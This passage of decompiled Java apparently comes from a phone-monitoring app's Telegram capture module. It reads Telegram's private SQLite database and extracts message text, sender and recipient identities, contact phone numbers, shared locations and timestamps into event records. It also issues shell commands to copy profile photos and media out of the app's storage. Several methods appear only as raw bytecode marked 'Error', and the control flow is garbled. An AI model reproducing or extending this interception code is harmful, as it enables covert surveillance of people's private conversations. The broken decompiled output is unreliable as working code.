    //   0	334	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	334	1	paramString1	String
    //   0	334	2	paramString2	String
    //   0	334	3	paramString3	String
    //   1	148	4	i	int
    //   207	3	4	bool1	boolean
    //   4	308	5	localObject1	Object
    //   316	1	5	localException1	Exception
    //   320	1	5	localObject2	Object
    //   9	216	6	localObject3	Object
    //   235	1	6	localException2	Exception
    //   241	1	6	localObject4	Object
    //   266	19	6	localObject5	Object
    //   287	1	6	localObject6	Object
    //   292	1	6	localObject7	Object
    //   301	1	6	localException3	Exception
    //   307	23	6	localObject8	Object
    //   12	258	7	bool2	boolean
    //   19	300	8	localObject9	Object
    //   22	147	9	str	String
    //   44	27	10	j	int
    //   90	237	10	k	int
    //   80	104	11	localObject10	Object
    // Exception table:
    //   from	to	target	type
    //   6	9	235	java/lang/Exception
    //   14	19	235	java/lang/Exception
    //   27	29	235	java/lang/Exception
    //   32	37	235	java/lang/Exception
    //   6	9	266	finally
    //   14	19	266	finally
    //   27	29	266	finally
    //   32	37	266	finally
    //   39	44	287	finally
    //   59	63	287	finally
    //   70	75	287	finally
    //   77	80	287	finally
    //   84	89	287	finally
    //   97	101	287	finally
    //   107	111	287	finally
    //   113	116	287	finally
    //   118	123	287	finally
    //   125	129	287	finally
    //   136	141	287	finally
    //   143	146	287	finally
    //   160	165	287	finally
    //   172	174	287	finally
    //   178	183	287	finally
    //   186	190	287	finally
    //   199	204	287	finally
    //   204	207	287	finally
    //   243	246	292	finally
    //   39	44	301	java/lang/Exception
    //   59	63	301	java/lang/Exception
    //   70	75	301	java/lang/Exception
    //   77	80	301	java/lang/Exception
    //   84	89	301	java/lang/Exception
    //   97	101	301	java/lang/Exception
    //   107	111	301	java/lang/Exception
    //   113	116	301	java/lang/Exception
    //   118	123	301	java/lang/Exception
    //   125	129	316	java/lang/Exception
    //   136	141	316	java/lang/Exception
    //   143	146	316	java/lang/Exception
    //   160	165	316	java/lang/Exception
    //   172	174	316	java/lang/Exception
    //   178	183	316	java/lang/Exception
    //   186	190	316	java/lang/Exception
    //   199	204	316	java/lang/Exception
    //   204	207	316	java/lang/Exception
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc_w 405
    //   5: astore_3
    //   6: aload_1
    //   7: aload_3
    //   8: invokevirtual 246	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   11: istore 4
    //   13: iload 4
    //   15: ifeq +21 -> 36
    //   18: iconst_1
    //   19: istore 4
    //   21: aload_1
    //   22: invokevirtual 407	java/lang/String:length	()I
    //   25: istore 5
    //   27: aload_1
    //   28: iload 4
    //   30: iload 5
    //   32: invokevirtual 410	java/lang/String:substring	(II)Ljava/lang/String;
    //   35: astore_1
    //   36: getstatic 412	com/vvt/capture/telegram/MyUncaughtExceptionHandler:d	Ljava/lang/String;
    //   39: astore_3
    //   40: iconst_1
    //   41: istore 5
    //   43: iload 5
    //   45: anewarray 4	java/lang/Object
    //   48: astore 6
    //   50: aload 6
    //   52: iconst_0
    //   53: aload_1
    //   54: aastore
    //   55: aload_0
    //   56: aload_3
    //   57: aload 6
    //   59: invokevirtual 49	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:queryFinalized	(Ljava/lang/String;[Ljava/lang/Object;)Lcom/vvt/capture/telegram/internal/SQLite/SQLiteCursor;
    //   62: astore_3
    //   63: aload_3
    //   64: invokevirtual 55	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:next	()Z
    //   67: istore 5
    //   69: iload 5
    //   71: ifeq +15 -> 86
    //   74: iconst_0
    //   75: istore 5
    //   77: aconst_null
    //   78: astore 6
    //   80: aload_3
    //   81: iconst_0
    //   82: invokevirtual 376	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:stringValue	(I)Ljava/lang/String;
    //   85: astore_2
    //   86: aload_3
    //   87: ifnull +7 -> 94
    //   90: aload_3
    //   91: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   94: aload_2
    //   95: areturn
    //   96: astore_3
    //   97: iconst_0
    //   98: istore 4
    //   100: aconst_null
    //   101: astore_3
    //   102: getstatic 17	com/vvt/capture/telegram/removeFromPath:removeFromPath	Z
    //   105: istore 5
    //   107: iload 5
    //   109: ifeq +3 -> 112
    //   112: aload_3
    //   113: ifnull -19 -> 94
    //   116: goto -26 -> 90
    //   119: astore 7
    //   121: iconst_0
    //   122: istore 4
    //   124: aconst_null
    //   125: astore_3
    //   126: aload 7
    //   128: astore_2
    //   129: aload_3
    //   130: ifnull +7 -> 137
    //   133: aload_3
    //   134: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   137: aload_2
    //   138: athrow
    //   139: astore_2
    //   140: goto -11 -> 129
    //   143: astore 6
    //   145: goto -43 -> 102
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	148	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	148	1	paramString	String
    //   1	137	2	localObject1	Object
    //   139	1	2	localObject2	Object
    //   5	86	3	localObject3	Object
    //   96	1	3	localException1	Exception
    //   101	33	3	localObject4	Object
    //   11	18	4	i	int
    //   98	25	4	j	int
    //   25	19	5	k	int
    //   67	41	5	bool	boolean
    //   48	31	6	arrayOfObject	Object[]
    //   143	1	6	localException2	Exception
    //   119	8	7	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   7	11	96	java/lang/Exception
    //   21	25	96	java/lang/Exception
    //   30	35	96	java/lang/Exception
    //   36	39	96	java/lang/Exception
    //   43	48	96	java/lang/Exception
    //   53	55	96	java/lang/Exception
    //   57	62	96	java/lang/Exception
    //   7	11	119	finally
    //   21	25	119	finally
    //   30	35	119	finally
    //   36	39	119	finally
    //   43	48	119	finally
    //   53	55	119	finally
    //   57	62	119	finally
    //   63	67	139	finally
    //   81	85	139	finally
    //   102	105	139	finally
    //   63	67	143	java/lang/Exception
    //   81	85	143	java/lang/Exception
  }
  
  private static String a(TLRPC.User paramUser, String paramString1, String paramString2)
  {
    String str1 = null;
    Object localObject = paramUser.photo;
    if (localObject != null)
    {
      localObject = paramUser.photo.photo_big;
      if (localObject != null)
      {
        localObject = paramUser.photo.photo_big;
        str1 = d.a((TLRPC.FileLocation)localObject, paramString1);
      }
      if (str1 == null)
      {
        localObject = paramUser.photo.photo_small;
        str1 = d.a((TLRPC.FileLocation)localObject, paramString1);
      }
    }
    boolean bool;
    String str2;
    if (str1 != null)
    {
      bool = str1.contains(paramString1);
      if (!bool)
      {
        bool = true;
        str2 = "telegramProfile";
      }
    }
    for (localObject = a(paramString1, str1, bool, str2, paramString2);; localObject = str1)
    {
      return (String)localObject;
      bool = false;
      localObject = null;
      break;
    }
  }
  
  public static String a(String paramString)
  {
    String str1 = null;
    String str2 = ".";
    boolean bool1 = paramString.contains(str2);
    if (bool1)
    {
      int i = paramString.lastIndexOf(".") + 1;
      str2 = paramString.substring(i);
      String str3 = "ogg";
      boolean bool2 = str2.contains(str3);
      if (bool2) {
        str2 = "mp3";
      }
      if (str2 != null) {
        str1 = MimeTypeMap.getSingleton().getMimeTypeFromExtension(str2);
      }
    }
    if (str1 == null) {
      str1 = "application/x-binary";
    }
    return str1;
  }
  
  /* Error */
  private static String a(String paramString1, String paramString2, String paramString3)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: getstatic 12	com/vvt/capture/telegram/removeFromPath:a	Z
    //   8: istore 5
    //   10: iload 5
    //   12: ifeq +3 -> 15
    //   15: aload_1
    //   16: ldc_w 452
    //   19: invokestatic 238	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   22: astore 6
    //   24: new 335	java/lang/StringBuilder
    //   27: astore 7
    //   29: aload 7
    //   31: invokespecial 336	java/lang/StringBuilder:<init>	()V
    //   34: aload_0
    //   35: invokestatic 455	com/vvt/io/d:j	(Ljava/lang/String;)Ljava/lang/String;
    //   38: astore 8
    //   40: aload 7
    //   42: aload 8
    //   44: invokevirtual 357	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   47: ldc_w 457
    //   50: invokevirtual 357	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   53: invokevirtual 366	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   56: astore 7
    //   58: aload 6
    //   60: aload 7
    //   62: invokestatic 238	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   65: astore 8
    //   67: invokestatic 462	com/vvt/aa/a:FxFileObserverWorker	()Z
    //   70: istore 5
    //   72: iload 5
    //   74: ifeq +245 -> 319
    //   77: ldc_w 464
    //   80: astore 7
    //   82: aload_1
    //   83: aload 7
    //   85: invokestatic 238	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   88: astore 7
    //   90: getstatic 12	com/vvt/capture/telegram/removeFromPath:a	Z
    //   93: istore 9
    //   95: iload 9
    //   97: ifeq +3 -> 100
    //   100: new 220	java/io/File
    //   103: astore 10
    //   105: aload 10
    //   107: aload 6
    //   109: invokespecial 223	java/io/File:<init>	(Ljava/lang/String;)V
    //   112: aload 10
    //   114: invokevirtual 226	java/io/File:exists	()Z
    //   117: istore 11
    //   119: iload 11
    //   121: ifne +9 -> 130
    //   124: aload 10
    //   126: invokevirtual 467	java/io/File:mkdirs	()Z
    //   129: pop
    //   130: invokestatic 472	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   133: astore 6
    //   135: ldc_w 474
    //   138: astore 10
    //   140: iconst_2
    //   141: istore 12
    //   143: iload 12
    //   145: anewarray 4	java/lang/Object
    //   148: astore 13
    //   150: iconst_0
    //   151: istore 14
    //   153: aload 13
    //   155: iconst_0
    //   156: aload 7
    //   158: aastore
    //   159: iconst_1
    //   160: istore 14
    //   162: aload 13
    //   164: iload 14
    //   166: aload 8
    //   168: aastore
    //   169: aload 10
    //   171: aload 13
    //   173: invokestatic 478	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   176: astore 10
    //   178: aload 6
    //   180: aload 10
    //   182: invokevirtual 479	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   185: pop
    //   186: ldc_w 481
    //   189: astore 10
    //   191: iconst_3
    //   192: istore 12
    //   194: iload 12
    //   196: anewarray 4	java/lang/Object
    //   199: astore 13
    //   201: iconst_0
    //   202: istore 14
    //   204: aload 13
    //   206: iconst_0
    //   207: aload 7
    //   209: aastore
    //   210: iconst_1
    //   211: istore 5
    //   213: aload 13
    //   215: iload 5
    //   217: aload_0
    //   218: aastore
    //   219: iconst_2
    //   220: istore 5
    //   222: aload 13
    //   224: iload 5
    //   226: aload 8
    //   228: aastore
    //   229: aload 10
    //   231: aload 13
    //   233: invokestatic 478	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   236: astore 7
    //   238: aload 6
    //   240: aload 7
    //   242: invokevirtual 479	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   245: pop
    //   246: ldc2_w 482
    //   249: lstore 15
    //   251: lload 15
    //   253: invokestatic 491	android/os/SystemClock:sleep	(J)V
    //   256: getstatic 17	com/vvt/capture/telegram/removeFromPath:removeFromPath	Z
    //   259: istore 5
    //   261: iload 5
    //   263: ifeq +3 -> 266
    //   266: aload 8
    //   268: invokestatic 493	com/vvt/io/d:f	(Ljava/lang/String;)Z
    //   271: istore 5
    //   273: iload 5
    //   275: ifeq +137 -> 412
    //   278: aload_2
    //   279: aload 8
    //   281: invokestatic 371	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;Ljava/lang/String;)V
    //   284: getstatic 12	com/vvt/capture/telegram/removeFromPath:a	Z
    //   287: istore 5
    //   289: iload 5
    //   291: ifeq +3 -> 294
    //   294: aload 8
    //   296: astore 7
    //   298: aload 6
    //   300: ifnull +8 -> 308
    //   303: aload 6
    //   305: invokevirtual 495	com/vvt/shell/f:d	()V
    //   308: getstatic 12	com/vvt/capture/telegram/removeFromPath:a	Z
    //   311: istore_3
    //   312: iload_3
    //   313: ifeq +3 -> 316
    //   316: aload 7
    //   318: areturn
    //   319: ldc_w 497
    //   322: astore 7
    //   324: goto -242 -> 82
    //   327: astore 7
    //   329: iconst_0
    //   330: istore 5
    //   332: aconst_null
    //   333: astore 7
    //   335: getstatic 17	com/vvt/capture/telegram/removeFromPath:removeFromPath	Z
    //   338: istore 11
    //   340: iload 11
    //   342: ifeq +3 -> 345
    //   345: aload 7
    //   347: ifnull +8 -> 355
    //   350: aload 7
    //   352: invokevirtual 495	com/vvt/shell/f:d	()V
    //   355: iconst_0
    //   356: istore 5
    //   358: aconst_null
    //   359: astore 7
    //   361: goto -53 -> 308
    //   364: astore 7
    //   366: iconst_0
    //   367: istore 11
    //   369: aconst_null
    //   370: astore 6
    //   372: aload 6
    //   374: ifnull +8 -> 382
    //   377: aload 6
    //   379: invokevirtual 495	com/vvt/shell/f:d	()V
    //   382: aload 7
    //   384: athrow
    //   385: astore 7
    //   387: goto -15 -> 372
    //   390: astore 4
    //   392: aload 7
    //   394: astore 6
    //   396: aload 4
    //   398: astore 7
    //   400: goto -28 -> 372
    //   403: astore 7
    //   405: aload 6
    //   407: astore 7
    //   409: goto -74 -> 335
    //   412: iconst_0
    //   413: istore 5
    //   415: aconst_null
    //   416: astore 7
    //   418: goto -120 -> 298
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	421	0	paramString1	String
    //   0	421	1	paramString2	String
    //   0	421	2	paramString3	String
    //   1	312	3	bool1	boolean
    //   3	1	4	localObject1	Object
    //   390	7	4	localObject2	Object
    //   8	208	5	bool2	boolean
    //   220	5	5	i	int
    //   259	155	5	bool3	boolean
    //   22	384	6	localObject3	Object
    //   27	296	7	localObject4	Object
    //   327	1	7	localException1	Exception
    //   333	27	7	localObject5	Object
    //   364	19	7	localObject6	Object
    //   385	8	7	localObject7	Object
    //   398	1	7	localObject8	Object
    //   403	1	7	localException2	Exception
    //   407	10	7	localObject9	Object
    //   38	257	8	str	String
    //   93	3	9	bool4	boolean
    //   103	127	10	localObject10	Object
    //   117	251	11	bool5	boolean
    //   141	54	12	j	int
    //   148	84	13	arrayOfObject	Object[]
    //   151	52	14	k	int
    //   249	3	15	l	long
    // Exception table:
    //   from	to	target	type
    //   90	93	327	java/lang/Exception
    //   100	103	327	java/lang/Exception
    //   107	112	327	java/lang/Exception
    //   112	117	327	java/lang/Exception
    //   124	130	327	java/lang/Exception
    //   130	133	327	java/lang/Exception
    //   90	93	364	finally
    //   100	103	364	finally
    //   107	112	364	finally
    //   112	117	364	finally
    //   124	130	364	finally
    //   130	133	364	finally
    //   143	148	385	finally
    //   156	159	385	finally
    //   166	169	385	finally
    //   171	176	385	finally
    //   180	186	385	finally
    //   194	199	385	finally
    //   207	210	385	finally
    //   217	219	385	finally
    //   226	229	385	finally
    //   231	236	385	finally
    //   240	246	385	finally
    //   251	256	385	finally
    //   256	259	385	finally
    //   266	271	385	finally
    //   279	284	385	finally
    //   284	287	385	finally
    //   335	338	390	finally
    //   143	148	403	java/lang/Exception
    //   156	159	403	java/lang/Exception
    //   166	169	403	java/lang/Exception
    //   171	176	403	java/lang/Exception
    //   180	186	403	java/lang/Exception
    //   194	199	403	java/lang/Exception
    //   207	210	403	java/lang/Exception
    //   217	219	403	java/lang/Exception
    //   226	229	403	java/lang/Exception
    //   231	236	403	java/lang/Exception
    //   240	246	403	java/lang/Exception
    //   251	256	403	java/lang/Exception
    //   256	259	403	java/lang/Exception
    //   266	271	403	java/lang/Exception
    //   279	284	403	java/lang/Exception
    //   284	287	403	java/lang/Exception
  }
  
  private static String a(String paramString1, String paramString2, boolean paramBoolean, String paramString3, String paramString4)
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    String str = null;
    int n = paramString2.lastIndexOf("/") + 1;
    int i1 = paramString2.lastIndexOf(".");
    Object localObject1 = paramString2.substring(n, i1);
    i1 = paramString2.lastIndexOf(".");
    Object localObject2 = paramString2.substring(i1);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = ShellUtil.b(paramString2);
    boolean bool1;
    if (bool2)
    {
      Object localObject3 = new Object[i];
      localObject3[0] = paramString1;
      localObject3[m] = paramString3;
      localObject3[k] = localObject1;
      localObject3[j] = localObject2;
      localObject3 = String.format("%s/%s/%s%s", (Object[])localObject3);
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = paramString1;
      arrayOfObject[m] = paramString3;
      arrayOfObject[k] = localObject1;
      arrayOfObject[j] = localObject2;
      str = String.format("%s/%s/%s_c%s", arrayOfObject);
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject1 = ((StringBuilder)localObject1).append(paramString1);
      localObject2 = File.separator;
      localObject1 = (String)localObject2 + paramString3;
      localObject2 = new java/io/File;
      ((File)localObject2).<init>((String)localObject1);
      bool1 = ((File)localObject2).exists();
      if (!bool1) {
        ((File)localObject2).mkdirs();
      }
      if (paramBoolean)
      {
        ShellUtil.a(paramString2, (String)localObject3, 0);
        ShellUtil.b(paramString4, (String)localObject3);
      }
      ShellUtil.a(paramString2, str, 0);
      ShellUtil.b(paramString4, str);
      bool1 = a;
      if (!bool1) {}
    }
    for (;;)
    {
      return str;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private static String a(String paramString, String[] paramArrayOfString)
  {
    int i = 0;
    String str1 = paramString;
    for (;;)
    {
      int j = paramArrayOfString.length;
      if (i >= j) {
        break;
      }
      String str2 = "\\?";
      String str3 = paramArrayOfString[i];
      str1 = str1.replaceFirst(str2, str3);
      i += 1;
    }
    if (str1 == paramString) {
      str1 = null;
    }
    return str1;
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString, TelegramData paramTelegramData, TLRPC.Message paramMessage, com.vvt.base.b paramb, RunningMode paramRunningMode)
  {
    synchronized (b.class)
    {
      ArrayList localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
      int i = 6;
      com.vvt.im.events.info.a locala = null;
      int j = 0;
      if ((locala == null) && (j < i))
      {
        locala = a(paramSQLiteDatabase, paramTelegramData, paramMessage, paramString, paramb);
        if (locala == null)
        {
          RunningMode localRunningMode = RunningMode.LIMITED_1;
          if (paramRunningMode != localRunningMode) {}
        }
      }
      else
      {
        if (locala != null) {
          localArrayList.add(locala);
        }
        return localArrayList;
      }
      long l = 5000L;
      SystemClock.sleep(l);
      j += 1;
    }
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString1, SQLiteCursor paramSQLiteCursor, com.vvt.base.b paramb, String paramString2, RunningMode paramRunningMode)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      boolean bool1 = paramSQLiteCursor.next();
      if (!bool1) {
        break label996;
      }
      bool1 = a;
      if (bool1) {}
      localObject1 = paramb.f();
      locald = b(paramString1, paramString2, (String)localObject1);
      localTelegramData = new com/vvt/capture/telegram/TelegramData;
      localTelegramData.<init>();
      localf = new com/vvt/im/events/info/f;
      localf.<init>();
      localb = new com/vvt/im/events/info/b;
      localb.<init>();
      localObject3 = null;
      localObject4 = new java/util/ArrayList;
      ((ArrayList)localObject4).<init>();
      localObject5 = new java/util/ArrayList;
      ((ArrayList)localObject5).<init>();
      localObject1 = MessageType.Text;
      i2 = ((MessageType)localObject1).getNumber();
      bool1 = false;
      localObject1 = null;
      localObject1 = paramSQLiteCursor.byteArrayValue(0);
      boolean bool5 = a;
      if (bool5) {}
      localObject6 = new com/vvt/capture/telegram/internal/ByteBufferDesc;
      ((ByteBufferDesc)localObject6).<init>((byte[])localObject1);
      bool1 = false;
      localObject1 = null;
      int i = ((ByteBufferDesc)localObject6).readInt32(false);
      localObject7 = null;
      localObject6 = TLRPC.Message.TLdeserialize((AbstractSerializedData)localObject6, i, false);
      i = 2;
      i5 = paramSQLiteCursor.intValue(i);
      if (localObject6 == null) {
        break label985;
      }
      localObject7 = ((TLRPC.Message)localObject6).message;
      i = 3;
      str1 = paramSQLiteCursor.stringValue(i);
      i = 1;
      i = paramSQLiteCursor.intValue(i);
      int i6 = 1;
      if (i != i6) {
        break label1009;
      }
      i = 1;
      label232:
      str2 = String.valueOf(str1);
      if (i == 0) {
        break label1018;
      }
      localObject1 = TelegramData.Direction.OUT;
      localObject8 = locald.b();
      localf.a((String)localObject8);
      localObject8 = locald.a();
      localf.b((String)localObject8);
      localObject8 = locald.g();
      localf.e((String)localObject8);
      localObject8 = ((TLRPC.Message)localObject6).to_id;
      if (localObject8 == null) {
        break label1590;
      }
      localObject4 = ((TLRPC.Message)localObject6).to_id;
      i7 = ((TLRPC.Peer)localObject4).user_id;
      localObject4 = String.valueOf(i7);
      localObject8 = paramb.f();
      localObject4 = b(paramSQLiteDatabase, (String)localObject4, paramString1, (String)localObject8);
      localObject8 = localObject1;
      localObject9 = localObject4;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        com.vvt.im.events.info.d locald;
        TelegramData localTelegramData;
        f localf;
        com.vvt.im.events.info.b localb;
        Object localObject3;
        Object localObject4;
        Object localObject5;
        int i2;
        Object localObject6;
        Object localObject7;
        int i5;
        String str1;
        String str2;
        Object localObject8;
        int i7;
        Object localObject9;
        label349:
        int i8;
        long l1;
        long l2;
        long l3;
        Object localObject10;
        int j;
        Object localObject11;
        double d;
        int i3;
        boolean bool4 = b;
        if (bool4)
        {
          continue;
          Object localObject2 = ((TLRPC.Message)localObject6).media;
          bool4 = localObject2 instanceof TLRPC.TL_messageMediaContact;
          int i1;
          if (bool4)
          {
            localObject2 = MessageType.Contact;
            i1 = ((MessageType)localObject2).getNumber();
            localObject11 = new java/lang/StringBuilder;
            localObject4 = "Name:";
            ((StringBuilder)localObject11).<init>((String)localObject4);
            localObject4 = ((TLRPC.Message)localObject6).media;
            localObject4 = ((TLRPC.MessageMedia)localObject4).first_name;
            localObject11 = ((StringBuilder)localObject11).append((String)localObject4);
            localObject4 = "(";
            localObject11 = ((StringBuilder)localObject11).append((String)localObject4);
            localObject4 = ((TLRPC.Message)localObject6).media;
            localObject4 = ((TLRPC.MessageMedia)localObject4).phone_number;
            localObject11 = ((StringBuilder)localObject11).append((String)localObject4);
            localObject4 = ")";
            localObject11 = ((StringBuilder)localObject11).append((String)localObject4);
            localObject11 = ((StringBuilder)localObject11).toString();
            i7 = i1;
            localObject7 = localObject5;
          }
          else
          {
            localObject2 = paramSQLiteDatabase;
            localObject11 = paramString1;
            localObject5 = paramb;
            localObject4 = paramRunningMode;
            localObject5 = a(paramSQLiteDatabase, paramString1, localTelegramData, (TLRPC.Message)localObject6, paramb, paramRunningMode);
            i1 = localTelegramData.a();
            localObject11 = ((TLRPC.Message)localObject6).media;
            localObject11 = ((TLRPC.MessageMedia)localObject11).caption;
            if (localObject11 != null)
            {
              localObject2 = ((TLRPC.Message)localObject6).media;
              localObject11 = ((TLRPC.MessageMedia)localObject2).caption;
              localObject2 = MessageType.Text;
              i1 = ((MessageType)localObject2).getNumber();
              i7 = i1;
              localObject7 = localObject5;
              continue;
              localObject2 = localObject11;
              continue;
              localObject5 = localObject2;
            }
            else
            {
              i7 = i1;
              localObject11 = localObject7;
              localObject7 = localObject5;
              continue;
              i7 = i3;
              localObject11 = localObject7;
              localObject7 = localObject5;
              continue;
              localObject8 = localObject2;
              localObject9 = localObject4;
            }
          }
        }
      }
    }
    localObject1 = new java/text/SimpleDateFormat;
    localObject4 = "dd/MM/yy HH:mm:ss";
    ((SimpleDateFormat)localObject1).<init>((String)localObject4);
    localObject4 = new java/util/Date;
    i8 = ((TLRPC.Message)localObject6).date;
    l1 = i8;
    l2 = l1;
    l3 = 1000L;
    l2 = l1 * l3;
    l1 = l2;
    ((Date)localObject4).<init>(l2);
    localObject10 = ((SimpleDateFormat)localObject1).format((Date)localObject4);
    localObject1 = ((TLRPC.Message)localObject6).media;
    if (localObject1 != null)
    {
      localObject1 = ((TLRPC.Message)localObject6).media;
      j = localObject1 instanceof TLRPC.TL_messageMediaEmpty;
      if (j == 0)
      {
        localObject1 = ((TLRPC.Message)localObject6).media;
        j = localObject1 instanceof TLRPC.TL_messageMediaWebPage;
        if (j == 0)
        {
          j = 1;
          i8 = i5;
          if (i5 != j)
          {
            localObject1 = MessageType.none;
            ((MessageType)localObject1).getNumber();
            localObject1 = ((TLRPC.Message)localObject6).media;
            localObject1 = ((TLRPC.MessageMedia)localObject1).geo;
            if (localObject1 != null)
            {
              localObject11 = new com/vvt/im/events/info/c;
              ((com.vvt.im.events.info.c)localObject11).<init>();
              localObject1 = ((TLRPC.Message)localObject6).media;
              localObject1 = ((TLRPC.MessageMedia)localObject1).geo;
              d = ((TLRPC.GeoPoint)localObject1).lat;
              ((com.vvt.im.events.info.c)localObject11).a(d);
              localObject1 = ((TLRPC.Message)localObject6).media;
              localObject1 = ((TLRPC.MessageMedia)localObject1).geo;
              d = ((TLRPC.GeoPoint)localObject1)._long;
              ((com.vvt.im.events.info.c)localObject11).b(d);
              localObject1 = ((TLRPC.Message)localObject6).media;
              localObject1 = ((TLRPC.MessageMedia)localObject1).title;
              if (localObject1 != null)
              {
                localObject1 = ((TLRPC.Message)localObject6).media;
                localObject1 = ((TLRPC.MessageMedia)localObject1).title;
                ((com.vvt.im.events.info.c)localObject11).a((String)localObject1);
              }
              for (;;)
              {
                localObject1 = MessageType.ShareLocation;
                int k = ((MessageType)localObject1).getNumber();
                i7 = k;
                localObject3 = localObject11;
                localObject11 = localObject7;
                localObject7 = localObject5;
                localObject1 = a(paramSQLiteDatabase, str1);
                if (localObject1 != null) {
                  break label1553;
                }
                localObject1 = "";
                int i9 = ((TLRPC.Message)localObject6).id;
                if (i9 < 0) {
                  localObject1 = "Private:";
                }
                i9 = ((ArrayList)localObject9).size();
                if (i9 <= 0) {
                  break label1553;
                }
                localObject5 = new java/lang/StringBuilder;
                ((StringBuilder)localObject5).<init>();
                localObject5 = ((StringBuilder)localObject5).append((String)localObject1);
                k = 0;
                localObject1 = null;
                localObject1 = ((ArrayList)localObject9).get(0);
                localObject1 = (com.vvt.im.events.info.e)localObject1;
                localObject1 = ((com.vvt.im.events.info.e)localObject1).c();
                localObject1 = ((StringBuilder)localObject5).append((String)localObject1);
                localObject1 = ((StringBuilder)localObject1).toString();
                localObject5 = localObject1;
                if (localObject11 == null) {
                  break label1546;
                }
                localObject1 = ((String)localObject11).trim();
                localTelegramData.a((String)localObject1);
                localTelegramData.a(i7);
                localb.a(str2);
                localb.b((String)localObject5);
                localTelegramData.b((List)localObject7);
                i2 = ((TLRPC.Message)localObject6).date;
                long l4 = i2;
                long l5 = 1000L;
                l4 *= l5;
                localTelegramData.a(l4);
                localTelegramData.b((String)localObject10);
                localTelegramData.a((com.vvt.im.events.info.c)localObject3);
                localTelegramData.a((TelegramData.Direction)localObject8);
                localTelegramData.a((List)localObject9);
                localTelegramData.a(locald);
                localTelegramData.a(localf);
                localTelegramData.a(localb);
                i2 = ((TLRPC.Message)localObject6).flags & 0x4;
                int i4 = 4;
                if (i2 != i4)
                {
                  if (localObject1 != null)
                  {
                    i2 = ((String)localObject1).length();
                    if (i2 > 0)
                    {
                      i3 = c((String)localObject1);
                      if (i3 == 0)
                      {
                        localObject11 = "-1";
                        boolean bool2 = ((String)localObject1).startsWith((String)localObject11);
                        if (!bool2) {
                          break label977;
                        }
                      }
                    }
                  }
                  if (localObject7 != null)
                  {
                    int m = ((ArrayList)localObject7).size();
                    if (m > 0) {}
                  }
                  else
                  {
                    if (localObject3 == null) {
                      break label985;
                    }
                  }
                  label977:
                  localArrayList.add(localTelegramData);
                }
                label985:
                boolean bool3 = paramSQLiteCursor.next();
                if (bool3) {
                  break;
                }
                label996:
                bool3 = a;
                if (bool3) {}
                return localArrayList;
                label1009:
                bool3 = false;
                localObject1 = null;
                break label232;
                label1018:
                localObject4 = TelegramData.Direction.IN;
                int n = ((TLRPC.Message)localObject6).from_id;
                localObject9 = String.valueOf(n);
                localObject1 = paramb.f();
                localObject8 = b(paramSQLiteDatabase, (String)localObject9, paramString1, (String)localObject1);
                n = ((ArrayList)localObject8).size();
                if (n > 0)
                {
                  localObject10 = ((ArrayList)localObject8).iterator();
                  boolean bool6;
                  do
                  {
                    bool4 = ((Iterator)localObject10).hasNext();
                    if (!bool4) {
                      break;
                    }
                    localObject1 = ((Iterator)localObject10).next();
                    localObject1 = (com.vvt.im.events.info.e)localObject1;
                    String str3 = ((com.vvt.im.events.info.e)localObject1).d();
                    bool6 = str3.equalsIgnoreCase((String)localObject9);
                  } while (!bool6);
                  localf.a((String)localObject9);
                  localObject9 = ((com.vvt.im.events.info.e)localObject1).c();
                  localf.b((String)localObject9);
                  localObject1 = ((com.vvt.im.events.info.e)localObject1).a();
                  localf.e((String)localObject1);
                  localObject9 = localObject8;
                  localObject8 = localObject4;
                  break label349;
                }
                localf.a((String)localObject9);
                localObject1 = "Channel Admin";
                localf.b((String)localObject1);
                localObject9 = localObject8;
                localObject8 = localObject4;
                break label349;
                localObject1 = new java/lang/StringBuilder;
                ((StringBuilder)localObject1).<init>();
                localObject4 = ((TLRPC.Message)localObject6).media;
                localObject4 = ((TLRPC.MessageMedia)localObject4).geo;
                d = ((TLRPC.GeoPoint)localObject4).lat;
                localObject1 = ((StringBuilder)localObject1).append(d);
                localObject4 = ", ";
                localObject1 = ((StringBuilder)localObject1).append((String)localObject4);
                localObject4 = ((TLRPC.Message)localObject6).media;
